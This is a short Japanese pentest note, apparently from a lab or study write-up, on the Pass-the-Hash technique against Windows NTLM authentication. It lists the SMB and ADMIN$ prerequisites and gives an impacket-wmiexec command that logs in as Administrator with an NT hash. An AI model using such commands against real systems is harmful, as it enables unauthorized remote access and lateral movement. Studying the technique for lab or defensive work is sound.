この技術はNTLM認証を使用するサーバーまたはサービスでのみ有効であり、Kerberos認証を使用するサーバーまたはサービスでは有効ではないことに注意

# 前提条件
PtH には満たす必要のある 3 つの前提条件があります。

- ファイアウォール（通常はポート445）を介したSMB接続が必要
- Windowsのファイルとプリンタの共有機能が有効になっている
- ADMIN$と呼ばれる管理共有が 利用可能である

```zsh
/usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.184.73
```
![](../../../assets/images/Pasted%20image%2020260502093001.png)
